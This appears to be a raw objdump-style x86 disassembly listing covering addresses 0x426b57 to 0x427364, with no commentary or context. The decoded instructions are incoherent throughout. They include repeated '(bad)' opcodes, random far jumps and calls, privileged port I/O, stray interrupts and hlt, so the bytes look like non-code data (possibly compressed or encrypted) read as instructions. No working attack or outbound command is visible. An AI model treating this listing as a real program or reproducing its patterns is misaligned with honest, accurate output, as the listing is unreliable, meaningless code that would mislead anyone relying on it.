  426b57:	jb     0x426b55
  426b59:	popa   
  426b5a:	cld    
  426b5b:	sti    
  426b5c:	retf   
  426b5d:	push   ebx
  426b5e:	dec    esp
  426b5f:	xor    al,BYTE PTR [eax+0x581d3904]
  426b65:	add    eax,0xe9ae7605
  426b6a:	mov    ds:0x7cfedf80,al
  426b6f:	cmp    BYTE PTR [ebx+0x51fcf87a],0xe7
  426b76:	dec    esi
  426b77:	rcr    BYTE PTR [edx+0x24],0xb9
  426b7b:	loopne 0x426bf0
  426b7d:	xchg   ecx,eax
  426b7e:	lock sub al,0xbb
  426b81:	mov    al,0xa9
  426b83:	cmp    eax,0xb026f639
  426b88:	or     cl,BYTE PTR [edx+0x6752c4eb]
  426b8e:	or     BYTE PTR [ebp+0x29],ah
  426b91:	xchg   edi,eax
  426b92:	mov    bl,0x77
  426b94:	ja     0x426b92
  426b96:	in     eax,0xa5
  426b98:	stos   DWORD PTR es:[edi],eax
  426b99:	xchg   BYTE PTR [edx+0x5d],dl
  426b9c:	test   eax,0xaa42097d
  426ba1:	jle    0x426b6b
  426ba3:	bound  eax,QWORD PTR [esi-0x68]
  426ba6:	jae    0x426b38
  426ba8:	fidiv  DWORD PTR [ebx-0x712f3a57]
  426bae:	pop    edi
  426baf:	stos   BYTE PTR es:[edi],al
  426bb0:	add    eax,0x1b2b8229
  426bb5:	test   al,0x4a
  426bb7:	adc    ebx,esi
  426bb9:	pushf  
  426bba:	xchg   ecx,eax
  426bbb:	push   ss
  426bbc:	ins    BYTE PTR es:[edi],dx
  426bbd:	xchg   esi,eax
  426bbe:	push   eax
  426bbf:	mov    dl,0x2e
  426bc1:	cli    
  426bc2:	mov    ch,BYTE PTR [ebp+ebp*8+0xb]
  426bc6:	mov    dl,0xf6
  426bc8:	out    0x65,eax
  426bca:	inc    edi
  426bcb:	(bad)  
  426bcc:	loope  0x426bb3
  426bce:	xor    al,BYTE PTR [eax]
  426bd0:	or     esp,DWORD PTR [esi-0x5f]
  426bd3:	cmp    al,0xec
  426bd5:	xor    DWORD PTR [ecx+esi*1-0x3],eax
  426bd9:	bound  ebp,QWORD PTR [ebx+0x262343e5]
  426bdf:	shr    BYTE PTR [eax+0x7d30d22c],1
  426be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426be6:	inc    ecx
  426be7:	sub    ah,dh
  426be9:	fdivrp st(0),st
  426beb:	add    ah,BYTE PTR [eax+eax*1]
	...
  426bfa:	inc    eax
  426bfb:	stos   BYTE PTR es:[edi],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0x25fe433f,al
  426c07:	aaa    
  426c08:	mov    eax,0x1e218df
  426c0d:	add    bl,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [ebx],al
  426c13:	push   esi
  426c14:	xchg   esp,eax
  426c15:	mov    eax,0xc60b6ab8
  426c1a:	ss and esp,esp
  426c1d:	mov    ebx,0x42baf79f
  426c22:	test   al,0xe0
  426c24:	je     0x426c5a
  426c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c27:	adc    al,0x36
  426c29:	mov    ebx,0xce551ce6
  426c2e:	test   dh,ah
  426c30:	test   BYTE PTR [ecx+0x2d],cl
  426c33:	fwait
  426c34:	sub    DWORD PTR [edi+0x58e36941],ecx
  426c3a:	retf   0xd618
  426c3d:	fistp  DWORD PTR [esi-0x27]
  426c40:	fldenv [ebx-0x28]
  426c43:	xor    al,0x43
  426c45:	addr16 sub bh,bl
  426c48:	ja     0x426bea
  426c4a:	mov    dh,0xe
  426c4c:	sbb    BYTE PTR [esi],bh
  426c4e:	(bad)  
  426c4f:	xor    esp,DWORD PTR [edx+0xe]
  426c52:	jno    0x426c54
  426c54:	into   
  426c55:	mov    al,0x18
  426c57:	aas    
  426c58:	imul   edi,DWORD PTR [ebx],0x874c2754
  426c5e:	dec    eax
  426c5f:	pop    es
  426c60:	repz enter 0x45e2,0xb4
  426c65:	push   esp
  426c66:	rol    BYTE PTR [ecx+0x4f],1
  426c69:	mov    ebp,0xeb596f6c
  426c6e:	mov    eax,0x1f2e8a2f
  426c73:	push   0x68a0a4a
  426c78:	lea    esp,[edi+0x3]
  426c7b:	push   ds
  426c7c:	fisttp DWORD PTR [ecx+edi*8+0x279bff74]
  426c83:	jecxz  0x426c67
  426c85:	mov    esi,DWORD PTR [edx-0xa24482c]
  426c8b:	or     edi,DWORD PTR [eax]
  426c8d:	push   edx
  426c8e:	imul   eax,DWORD PTR [ebp-0x200853cf],0x5b
  426c95:	pop    DWORD PTR [ebp+0x61]
  426c98:	mov    ds:0xbbaf6f9b,eax
  426c9d:	mov    esp,0x3a0633fd
  426ca2:	xor    cl,bl
  426ca4:	jae    0x426c8b
  426ca6:	out    dx,al
  426ca7:	addr16 test bh,al
  426caa:	inc    edi
  426cab:	retf   
  426cac:	cmc    
  426cad:	pushf  
  426cae:	js     0x426c5e
  426cb0:	popf   
  426cb1:	xchg   ebx,eax
  426cb2:	add    DWORD PTR [esp+edx*4],esi
  426cb5:	scas   eax,DWORD PTR es:[edi]
  426cb6:	push   cs
  426cb7:	loop   0x426d24
  426cb9:	pop    eax
  426cba:	sti    
  426cbb:	dec    esp
  426cbc:	push   ss
  426cbd:	mov    ds:0xba95727d,eax
  426cc2:	mov    al,ds:0xecbbf91b
  426cc7:	in     eax,dx
  426cc8:	push   ds
  426cc9:	dec    esi
  426cca:	dec    BYTE PTR [edi-0x1431dd1d]
  426cd0:	or     eax,0xdb171ed6
  426cd5:	pop    eax
  426cd6:	pushf  
  426cd7:	mov    ds:0x6a5c6ddb,eax
  426cdc:	in     al,dx
  426cdd:	pop    es
  426cde:	jno    0x426ce3
  426ce0:	ffree  st(0)
  426ce2:	adc    al,0x4e
  426ce4:	pop    edi
  426ce6:	pop    es
  426ce7:	jmp    0xff7f38bb
  426cec:	sti    
  426ced:	dec    eax
  426cee:	add    BYTE PTR [edx+0x33],0xc5
  426cf2:	repz mov ebp,0x60c35a47
  426cf8:	test   BYTE PTR [ebx+ebp*8+0x4d],dl
  426cfc:	pop    eax
  426cfd:	mov    cs,WORD PTR [esp+edi*4]
  426d00:	inc    edi
  426d01:	imul   esi,DWORD PTR [eax-0x35],0xb2c03ebe
  426d08:	test   DWORD PTR [eax+0x368b52e6],0x2e220cc2
  426d12:	add    eax,0xd509ae26
  426d17:	add    esp,DWORD PTR [eax]
  426d19:	retf   0xe12c
  426d1c:	add    al,0x3d
  426d1e:	xor    cl,bh
  426d20:	pop    ebp
  426d21:	mov    esi,0x65355026
  426d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d27:	mov    WORD PTR [eax],ds
  426d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d2a:	cmp    esp,eax
  426d2c:	push   es
  426d2d:	pop    edi
  426d2e:	popf   
  426d2f:	mov    dh,0xcf
  426d31:	jp     0x426d7f
  426d33:	retf   
  426d34:	xor    BYTE PTR [edi+esi*2+0x43e8217f],bl
  426d3b:	or     DWORD PTR [ecx],ebx
  426d3d:	arpl   WORD PTR [edx-0x622bb314],ax
  426d43:	mov    ebx,0x50f84019
  426d48:	lds    edx,FWORD PTR [edx]
  426d4a:	call   esi
  426d4c:	cs mov bl,dh
  426d4f:	mov    cs,WORD PTR [eax-0x2]
  426d52:	(bad)  
  426d53:	jb     0x426dc2
  426d55:	and    ebx,DWORD PTR [esi+edi*4-0x59f14e0]
  426d5c:	xchg   esp,eax
  426d5d:	xor    eax,0x35ee7261
  426d62:	xor    ecx,DWORD PTR [edi-0x41]
  426d65:	dec    esi
  426d66:	int    0x8
  426d68:	xlat   BYTE PTR ds:[ebx]
  426d69:	rol    esi,0xe5
  426d6c:	mov    es,WORD PTR [edx+eiz*2]
  426d6f:	ror    BYTE PTR [ecx+0x5230f08f],1
  426d75:	mov    ecx,0x49789542
  426d7a:	sbb    edx,ecx
  426d7c:	sbb    edi,esp
  426d7e:	inc    ebx
  426d7f:	sub    BYTE PTR [ebx-0x6be811b7],bl
  426d85:	dec    eax
  426d86:	fs cdq 
  426d88:	dec    esp
  426d89:	pop    es
  426d8a:	or     BYTE PTR [ebx+edi*8],dh
  426d8d:	xchg   ebx,eax
  426d8e:	shr    DWORD PTR [ecx+eax*1-0x3635c5fb],cl
  426d95:	ret    
  426d96:	mov    bh,0x2b
  426d98:	mov    ebp,0x8f1f1a74
  426d9d:	fadd   QWORD PTR [edi+0x3498e14]
  426da3:	arpl   WORD PTR ds:0x7591065b,sp
  426da9:	jecxz  0x426d83
  426dab:	aaa    
  426dac:	fadd   QWORD PTR [ecx+0x36]
  426daf:	mov    edi,0xbaba9adb
  426db4:	sub    al,0x6
  426db6:	cmpxchg bl,cl
  426db9:	int3   
  426dba:	push   es
  426dbb:	mov    ebp,0xbcceee0
  426dc0:	and    DWORD PTR [edx-0x6a5d0142],0xe53d887b
  426dca:	jmp    0x504e:0x61dc655f
  426dd1:	(bad)  
  426dd2:	and    al,0xda
  426dd4:	adc    esp,ebx
  426dd6:	fnstsw WORD PTR ds:0xe44c
  426ddb:	or     ecx,ebx
  426ddd:	pop    ebp
  426dde:	or     al,0x62
  426de0:	sbb    al,BYTE PTR [ecx-0x7521d5dc]
  426de6:	lock adc eax,0x8eee932
  426dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ded:	hlt    
  426dee:	sbb    dh,ch
  426df0:	add    BYTE PTR [eax],cl
  426df2:	pop    ebp
  426df3:	repnz cmp edi,DWORD PTR [ebp-0x65]
  426df7:	hlt    
  426df8:	pop    ebp
  426df9:	or     al,0x5e
  426dfb:	xor    edi,esp
  426dfd:	in     al,0xf3
  426dff:	push   es
  426e00:	stos   BYTE PTR es:[edi],al
  426e01:	inc    edx
  426e02:	(bad)  
  426e03:	lock nop
  426e05:	mov    ebp,0xa3ea4246
  426e0a:	jl     0x426da9
  426e0c:	test   DWORD PTR [eax],eax
	...
  426e1a:	mov    dh,0xe4
  426e1c:	xlat   BYTE PTR ds:[ebx]
  426e1d:	push   esp
  426e1e:	xlat   BYTE PTR ds:[ebx]
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	and    ch,ch
  426e28:	add    bl,BYTE PTR [esi+0x1e413]
  426e2e:	sti    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [ebp+0x45756f6d],ch
  426e37:	xchg   BYTE PTR [ecx-0x3f62163d],ah
  426e3d:	ins    BYTE PTR es:[edi],dx
  426e3e:	sbb    DWORD PTR [ecx-0x3c4d092c],esi
  426e44:	xor    dl,bh
  426e46:	xor    eax,0x2b2c510f
  426e4b:	fisubr WORD PTR [edi+0x13]
  426e4e:	mov    DWORD PTR [edx],ebx
  426e50:	mov    BYTE PTR [ecx+0x7aa69c66],dl
  426e56:	cs dec edi
  426e58:	imul   edi,ebp,0x2761845d
  426e5e:	jge    0x426e64
  426e60:	js     0x426e1a
  426e62:	mov    al,ds:0xe3385e77
  426e67:	push   edi
  426e68:	mov    eax,0x3d02bb24
  426e6d:	mov    al,ah
  426e6f:	mov    ebx,0x5a04f69e
  426e74:	xchg   edx,eax
  426e75:	inc    esi
  426e76:	jne    0x426e88
  426e78:	js     0x426eaa
  426e7a:	pop    ss
  426e7b:	cld    
  426e7c:	js     0x426e98
  426e7e:	xchg   esp,eax
  426e7f:	add    eax,0x5f65e1c3
  426e84:	add    al,0xaa
  426e86:	inc    esi
  426e87:	scas   al,BYTE PTR es:[edi]
  426e88:	loop   0x426e91
  426e8a:	xor    eax,0x69d6f242
  426e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e90:	loop   0x426e86
  426e92:	jo     0x426e25
  426e94:	mov    al,ds:0x78a3ef85
  426e99:	xchg   DWORD PTR [ebx+edi*4+0x25d274b9],ebp
  426ea0:	xchg   ecx,eax
  426ea1:	popa   
  426ea2:	hlt    
  426ea3:	adc    ah,BYTE PTR [eax-0x22]
  426ea6:	in     eax,0x13
  426ea8:	cdq    
  426ea9:	sahf   
  426eaa:	xchg   cl,cl
  426eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ead:	mov    ebx,0x50d72e57
  426eb2:	mov    ebp,0x40ea5f68
  426eb7:	push   0xcad758b
  426ebc:	xchg   ebp,eax
  426ebd:	jae    0x426e52
  426ebf:	nop
  426ec0:	mov    esi,DWORD PTR [edx-0x32]
  426ec3:	retf   
  426ec4:	and    ah,BYTE PTR [ebx-0x74]
  426ec7:	xor    esi,DWORD PTR [ecx]
  426ec9:	scas   al,BYTE PTR es:[edi]
  426eca:	mov    ss,eax
  426ecc:	inc    edi
  426ecd:	add    cl,BYTE PTR [edx]
  426ecf:	pop    ecx
  426ed0:	repz xor BYTE PTR [esi],dh
  426ed3:	dec    ebx
  426ed4:	into   
  426ed5:	sahf   
  426ed6:	imul   ebx,ebx,0x6111082d
  426edc:	push   eax
  426edd:	call   0x295d8b94
  426ee2:	push   0x4
  426ee4:	jp     0x426eb8
  426ee6:	push   es
  426ee7:	cmp    esp,esi
  426ee9:	cmc    
  426eea:	addr16 int 0x45
  426eed:	in     eax,dx
  426eee:	hlt    
  426eef:	stos   DWORD PTR es:[edi],eax
  426ef0:	int    0x87
  426ef2:	mov    cl,0xa2
  426ef4:	lahf   
  426ef5:	outs   dx,DWORD PTR ds:[esi]
  426ef6:	mov    edi,0x12a02eb1
  426efb:	mov    edx,0x8ff155cf
  426f00:	pop    ecx
  426f01:	jmp    0x426f0e
  426f03:	jle    0x426ee9
  426f05:	push   esi
  426f06:	cli    
  426f07:	add    BYTE PTR [eax+ebx*8-0x42],dh
  426f0b:	retf   0x956f
  426f0e:	(bad)  
  426f0f:	jecxz  0x426f72
  426f11:	xchg   edi,eax
  426f12:	stos   BYTE PTR es:[edi],al
  426f13:	ins    BYTE PTR es:[edi],dx
  426f14:	pop    eax
  426f15:	push   ss
  426f16:	dec    esp
  426f17:	push   es
  426f18:	or     eax,0x2f9422b8
  426f1d:	popf   
  426f1e:	outs   dx,BYTE PTR ds:[esi]
  426f1f:	pop    edx
  426f20:	addr16 imul di,bp,0x442a
  426f26:	jge    0x426ec9
  426f28:	push   ss
  426f29:	push   ss
  426f2a:	hlt    
  426f2b:	hlt    
  426f2c:	mov    ds:0x75561242,al
  426f31:	fs jmp 0x3ed0:0x402465d8
  426f39:	popf   
  426f3a:	xchg   ebp,eax
  426f3b:	mov    bl,BYTE PTR ds:0xd846d7e9
  426f41:	sub    edx,DWORD PTR [edx+ebx*8+0x51]
  426f45:	pop    es
  426f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f47:	dec    ebx
  426f48:	mov    ebp,0xdf00ce5e
  426f4d:	inc    si
  426f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f50:	push   ds
  426f51:	and    al,0x71
  426f53:	push   0xd3ac7ec8
  426f58:	imul   ecx,DWORD PTR [edx+0x6d44dd3b],0x7f2fe26b
  426f62:	and    ebx,DWORD PTR [esi+ebx*4+0x1ac5874f]
  426f69:	sub    BYTE PTR ds:0x9c214447,bl
  426f6f:	out    0xcb,al
  426f71:	mov    dh,0xbc
  426f73:	pushf  
  426f74:	jge    0x426f03
  426f76:	in     al,0x8d
  426f78:	std    
  426f79:	shl    BYTE PTR [esi+eiz*4],0x4d
  426f7d:	cmp    cl,BYTE PTR [ebx]
  426f7f:	mov    al,0x75
  426f81:	inc    ecx
  426f82:	ret    
  426f83:	and    al,0xfc
  426f85:	inc    ecx
  426f86:	add    al,0xe5
  426f88:	int    0xa8
  426f8a:	mov    al,ds:0x8e259ae3
  426f8f:	pop    eax
  426f90:	and    esi,DWORD PTR [ebx+0x44ccbb1f]
  426f96:	imul   edi,ecx,0xffffff84
  426f99:	test   DWORD PTR [ebx+eiz*2+0x11],ebp
  426f9d:	sub    ebx,DWORD PTR [eax-0x2fe334ea]
  426fa3:	add    edx,DWORD PTR [ecx+0x7f]
  426fa6:	adc    edx,esp
  426fa8:	add    eax,0x5ca1d51b
  426fad:	enter  0xa704,0x11
  426fb1:	arpl   WORD PTR [edx],cx
  426fb3:	mov    WORD PTR [edi+0x6a],?
  426fb6:	push   ecx
  426fb7:	cli    
  426fb8:	aam    0xb
  426fba:	xchg   edx,eax
  426fbb:	push   es
  426fbc:	mov    ds:0x31f8c8e2,eax
  426fc1:	mov    al,0xbc
  426fc3:	ret    0x7225
  426fc6:	mov    BYTE PTR [esi+0x3cfe60f4],al
  426fcc:	jl     0x42701f
  426fce:	cmp    ebp,DWORD PTR [edi-0x1826c76e]
  426fd4:	sbb    eax,0xa05c28fd
  426fd9:	xor    DWORD PTR [ecx+0x28ea72ca],0xffffffab
  426fe0:	xlat   BYTE PTR ds:[ebx]
  426fe1:	pop    edi
  426fe2:	xor    al,0xf
  426fe4:	mov    esp,0xd65bc513
  426fe9:	add    BYTE PTR [ebp+0x7e8139cf],bh
  426fef:	shl    DWORD PTR [ebp-0x4afd965b],0xb1
  426ff6:	xchg   edx,eax
  426ff7:	fcomp  DWORD PTR [eax-0x1ffd1efa]
  426ffd:	xchg   ebx,eax
  426ffe:	or     DWORD PTR [esi+0x76],ebx
  427001:	jns    0x42702e
  427003:	jecxz  0x426fbb
  427005:	mov    al,0xb4
  427007:	or     DWORD PTR [edi+0x7ee63a37],esi
  42700d:	not    DWORD PTR [ecx]
  42700f:	out    dx,eax
  427010:	in     al,dx
  427011:	adc    DWORD PTR [eax+0x57],esi
  427014:	test   dl,cl
  427016:	dec    eax
  427017:	push   ecx
  427018:	sub    BYTE PTR [ecx-0xd],0xea
  42701c:	jae    0x426fb4
  42701e:	fbstp  TBYTE PTR [ebx-0x7f]
  427021:	dec    edx
  427022:	dec    esi
  427023:	xor    BYTE PTR [eax+eax*8-0x6c],dh
  427027:	add    eax,0x914c0465
  42702c:	mov    eax,0x0
	...
  427039:	add    dl,bh
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx+0x21a43d15]
  427047:	aaa    
  427048:	cmp    esi,eax
  42704a:	push   cs
  42704b:	out    0x1,al
  42704d:	add    bl,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [edi-0x71],dl
  427054:	pop    ebx
  427055:	ins    DWORD PTR es:[edi],dx
  427056:	inc    esi
  427057:	add    eax,0xdd3bbfe0
  42705c:	jnp    0x427084
  42705e:	pop    eax
  42705f:	jb     0x427044
  427061:	lds    edx,FWORD PTR [edi-0x21]
  427064:	fpatan 
  427066:	pop    edi
  427067:	xchg   edi,eax
  427068:	inc    eax
  427069:	mov    edi,0x84d103b
  42706e:	int    0x21
  427070:	and    ecx,edx
  427072:	repnz (bad) 
  427074:	push   ss
  427075:	jg     0x427065
  427077:	daa    
  427078:	push   ss
  427079:	in     al,dx
  42707a:	arpl   WORD PTR [esi-0x15611fef],sp
  427080:	pop    ebp
  427081:	sbb    DWORD PTR [edx],edx
  427083:	fs xchg eax,ebp
  427086:	jae    0x42706f
  427088:	or     eax,DWORD PTR [ecx-0x5063c0d8]
  42708e:	jmp    0xfef7:0xc4de0742
  427095:	adc    al,0x3
  427097:	imul   esp,DWORD PTR [ecx],0xffffff8c
  42709a:	cbw    
  42709c:	inc    edx
  42709d:	ret    
  42709e:	mov    bl,0xe9
  4270a0:	(bad)  
  4270a2:	mov    eax,ds:0x45d8e00f
  4270a7:	pop    es
  4270a8:	or     cl,BYTE PTR ds:0xde613eaf
  4270ae:	jne    0x42712e
  4270b0:	xchg   ecx,eax
  4270b1:	push   esi
  4270b2:	xor    DWORD PTR [ecx+ebx*4-0x42],ecx
  4270b6:	mov    esp,0x82616b38
  4270bb:	ins    DWORD PTR es:[edi],dx
  4270bc:	mov    bh,0x1e
  4270be:	xchg   ecx,eax
  4270bf:	cmp    eax,DWORD PTR [edi-0xfb44733]
  4270c5:	jbe    0x4270a4
  4270c7:	pop    esi
  4270c8:	in     al,dx
  4270c9:	push   edi
  4270ca:	popf   
  4270cb:	push   ebp
  4270cc:	dec    edx
  4270cd:	inc    esi
  4270ce:	mov    bl,BYTE PTR [ebp-0x495cc3ed]
  4270d4:	and    BYTE PTR [ebp+0x53],dh
  4270d7:	arpl   ax,bp
  4270d9:	ret    0x6698
  4270dc:	sub    eax,0xd6896a7c
  4270e1:	mov    edi,0x548074f3
  4270e6:	cwde   
  4270e7:	sub    dh,BYTE PTR [esi-0x68]
  4270ea:	adc    BYTE PTR [edi],0xe3
  4270ed:	jns    0x427096
  4270ef:	sti    
  4270f0:	sbb    al,0xa1
  4270f2:	jb     0x4270e6
  4270f4:	ds repz push ebx
  4270f7:	pusha  
  4270f8:	and    eax,0x52f7995b
  4270fd:	es icebp 
  4270ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427100:	sub    BYTE PTR [ebx+eiz*4],ah
  427103:	cwde   
  427104:	sbb    DWORD PTR [ebx],edi
  427106:	fadd   DWORD PTR [ecx+ecx*4-0x5802e477]
  42710d:	dec    ebx
  42710e:	and    dh,bh
  427110:	in     al,dx
  427111:	call   0x303b:0x7bc4d1cb
  427118:	stc    
  427119:	retf   
  42711a:	scas   al,BYTE PTR es:[edi]
  42711b:	xor    eax,0xd9ab41f0
  427120:	lock jo 0x4270fd
  427123:	int3   
  427124:	cld    
  427125:	mov    bl,0x56
  427127:	in     eax,0x9f
  427129:	in     eax,dx
  42712a:	mov    BYTE PTR [edi],dl
  42712c:	cmp    al,BYTE PTR [ecx-0x49]
  42712f:	jmp    0x9c6199b
  427134:	fimul  WORD PTR [eax-0xe9e462e]
  42713a:	xlat   BYTE PTR ds:[ebx]
  42713b:	neg    DWORD PTR [edi+eax*8+0x60bb3d08]
  427142:	outs   dx,BYTE PTR ds:[esi]
  427143:	push   ebp
  427144:	mov    bh,0x28
  427146:	jmp    0xd7b0684d
  42714b:	not    DWORD PTR [esi-0x32e0ff7f]
  427151:	add    ch,bl
  427153:	xchg   edx,eax
  427154:	mov    ds:0xd85d4d70,al
  427159:	sbb    ebp,DWORD PTR [edx+edi*8+0x7f500023]
  427160:	jle    0x4271ab
  427162:	pop    es
  427163:	outs   dx,BYTE PTR ds:[esi]
  427164:	adc    BYTE PTR [edx],0x96
  427167:	inc    esi
  427168:	call   0x7e45c833
  42716d:	sub    al,0x94
  42716f:	lds    edx,FWORD PTR [esi-0x38]
  427172:	and    esi,DWORD PTR [edi-0x6f]
  427175:	fwait
  427176:	jle    0x427182
  427178:	call   0xf8ed2038
  42717d:	inc    ecx
  42717e:	fistp  DWORD PTR [edx]
  427180:	pop    ebp
  427181:	mov    cl,0x94
  427183:	and    bh,cl
  427185:	out    dx,al
  427186:	mov    bl,0x9d
  427188:	and    al,dh
  42718a:	lds    esp,FWORD PTR [eax+0x22ead52f]
  427190:	inc    ebx
  427191:	mov    esi,0xe28f8152
  427196:	in     al,dx
  427197:	or     BYTE PTR [ebx+edx*8-0x15],bl
  42719b:	xor    eax,0x1ff4bdcd
  4271a0:	jp     0x427156
  4271a2:	adc    dl,al
  4271a4:	lds    ebx,FWORD PTR [esi+0x6]
  4271a7:	shr    DWORD PTR [eax],1
  4271a9:	aad    0x40
  4271ab:	aaa    
  4271ac:	sub    al,0x56
  4271ae:	inc    esi
  4271af:	fcomp  QWORD PTR [esi-0x146c4452]
  4271b5:	arpl   WORD PTR [esi-0x7e89447e],ax
  4271bb:	pop    ds
  4271bc:	popf   
  4271bd:	mov    al,0xc6
  4271bf:	push   esp
  4271c0:	pop    esp
  4271c1:	loopne 0x42723d
  4271c3:	retf   0x3bbf
  4271c6:	sbb    al,0xda
  4271c8:	mov    ds:0xb061a81b,eax
  4271cd:	aaa    
  4271ce:	lock mov eax,0x77d03318
  4271d4:	ins    BYTE PTR es:[edi],dx
  4271d5:	cmc    
  4271d6:	aas    
  4271d7:	rcr    DWORD PTR [esi],0x2c
  4271da:	mov    al,ds:0x1dce8b90
  4271df:	shl    BYTE PTR [esi+0x75],1
  4271e2:	push   0x38
  4271e4:	xor    al,0xf8
  4271e6:	ss xchg ebp,eax
  4271e8:	test   BYTE PTR [eax+ebx*2],bh
  4271eb:	sbb    dl,al
  4271ed:	mov    cl,0x8c
  4271ef:	test   DWORD PTR [esi],ecx
  4271f1:	mov    bl,0x26
  4271f3:	push   edi
  4271f4:	test   DWORD PTR [ebx+eax*4+0x41e2fc31],esi
  4271fb:	jl     0x4271cd
  4271fd:	xor    BYTE PTR [eax],ch
  4271ff:	xor    al,ah
  427201:	xchg   DWORD PTR [ebp-0x25aa767f],esp
  427207:	mov    ch,0x47
  427209:	add    DWORD PTR [ebp+0x49a35095],eax
  42720f:	mov    es,WORD PTR [ecx+0x4dfbbddf]
  427215:	rol    BYTE PTR [ebp-0x11],cl
  427218:	inc    esi
  427219:	jno    0x427241
  42721b:	cdq    
  42721c:	xor    al,0xc1
  42721e:	jge    0x4271d4
  427220:	cmp    al,0x60
  427222:	cwde   
  427223:	xchg   edi,eax
  427224:	xor    eax,0x4f4764d0
  427229:	mul    ebx
  42722b:	push   es
  42722c:	xor    BYTE PTR [ecx-0x3ea54399],ah
  427232:	lods   al,BYTE PTR ds:[esi]
  427233:	(bad)  
  427234:	sub    DWORD PTR [eax-0x36546e1b],edi
  42723a:	mov    edx,0xb8dc808c
  42723f:	sbb    eax,0xba211a37
  427244:	lock (bad) 
  427247:	adc    ebx,DWORD PTR [edi]
  427249:	arpl   WORD PTR [edi],bp
  42724b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42724c:	rol    DWORD PTR [eax],1
	...
  42725a:	iret   
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x2eb02077
  427267:	pushf  
  427268:	sbb    al,0xaa
  42726a:	or     eax,ebp
  42726c:	add    DWORD PTR [eax],eax
  42726e:	sti    
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    BYTE PTR [esi+esi*2-0x12094f33],dh
  427278:	neg    BYTE PTR [edx]
  42727a:	fistp  QWORD PTR [ebx]
  42727c:	bound  ecx,QWORD PTR [esp+esi*4]
  42727f:	mov    edx,0x5742bede
  427284:	sahf   
  427285:	mov    al,0x9
  427287:	js     0x4272a0
  427289:	loopne 0x42728e
  42728b:	dec    esp
  42728c:	dec    edi
  42728d:	out    0x3b,eax
  42728f:	(bad)  
  427290:	lds    ebx,FWORD PTR [ecx+0xbb31c51]
  427296:	les    eax,FWORD PTR [ebx-0x4c]
  427299:	je     0x4272c8
  42729b:	aam    0x81
  42729d:	xor    al,cl
  42729f:	xchg   BYTE PTR [ecx-0x4becf6de],cl
  4272a5:	xchg   esp,eax
  4272a6:	adc    edi,DWORD PTR [ebx-0x43dafb96]
  4272ac:	and    al,0xff
  4272ae:	add    al,0x4c
  4272b0:	pop    edi
  4272b1:	add    BYTE PTR ds:0x3a381592,dl
  4272b7:	icebp  
  4272b8:	dec    ebx
  4272b9:	xchg   edx,eax
  4272ba:	and    al,0xa2
  4272bc:	aas    
  4272bd:	cmp    ch,BYTE PTR [ecx-0x57a58c70]
  4272c3:	jl     0x42726f
  4272c5:	push   esi
  4272c6:	xchg   BYTE PTR [ebp+0x7fe7c3e9],cl
  4272cc:	inc    edi
  4272cd:	loop   0x427280
  4272cf:	push   ds
  4272d0:	pop    ds
  4272d1:	pop    edi
  4272d2:	cmc    
  4272d3:	lods   eax,DWORD PTR ds:[esi]
  4272d4:	xor    BYTE PTR [eax],bl
  4272d6:	pop    edi
  4272d7:	jmp    0xcce7:0xa046a147
  4272de:	push   0xebcd2635
  4272e3:	jg     0x42733d
  4272e5:	in     eax,dx
  4272e6:	pop    es
  4272e7:	in     eax,dx
  4272e8:	adc    ch,BYTE PTR [eax-0x32]
  4272eb:	aaa    
  4272ec:	pushf  
  4272ed:	(bad)
  4272f0:	das    
  4272f1:	push   es
  4272f2:	test   al,0x44
  4272f4:	repz mov es,WORD PTR [eax-0x5b]
  4272f8:	xchg   esi,eax
  4272f9:	sub    dh,BYTE PTR [ecx]
  4272fb:	aaa    
  4272fc:	and    eax,0x2b165382
  427301:	rol    edx,0x41
  427304:	add    BYTE PTR [ecx+eax*4-0x76],ah
  427308:	shr    DWORD PTR fs:[ecx+ebp*4],cl
  42730c:	rcl    al,1
  42730e:	fadd   QWORD PTR [edi]
  427310:	jmp    0x40e8:0xdc379a3d
  427317:	xchg   esp,eax
  427318:	inc    edi
  427319:	rcr    BYTE PTR [ecx-0x39],1
  42731c:	fild   DWORD PTR ds:0xe8103870
  427322:	jae    0x4272da
  427324:	push   edi
  427325:	ror    BYTE PTR [eax+0x35],1
  427328:	fmul   QWORD PTR [edi]
  42732a:	inc    edx
  42732b:	(bad)
  42732e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42732f:	cmp    cl,bh
  427331:	les    esi,FWORD PTR ds:0x953325ed
  427337:	aad    0x8
  427339:	pop    esi
  42733a:	or     al,0xa2
  42733c:	fld    DWORD PTR [ebx+0x2]
  42733f:	pop    edi
  427340:	imul   ebx,DWORD PTR [ecx],0xf10a35eb
  427346:	xchg   edx,eax
  427347:	jns    0x4273b4
  427349:	xor    DWORD PTR [esi+0x6843296b],ebx
  42734f:	fimul  DWORD PTR [ebp+eiz*8-0x38]
  427353:	mov    edi,0xfcd9af0e
  427358:	dec    ebp
  427359:	inc    edi
  42735a:	pop    ds
  42735b:	inc    edx
  42735c:	ret    
  42735d:	push   esp
  42735e:	out    dx,eax
  42735f:	pop    ecx
  427360:	aam    0x70
  427362:	mov    DWORD PTR [ebx],edx
  427364:	out    dx,al
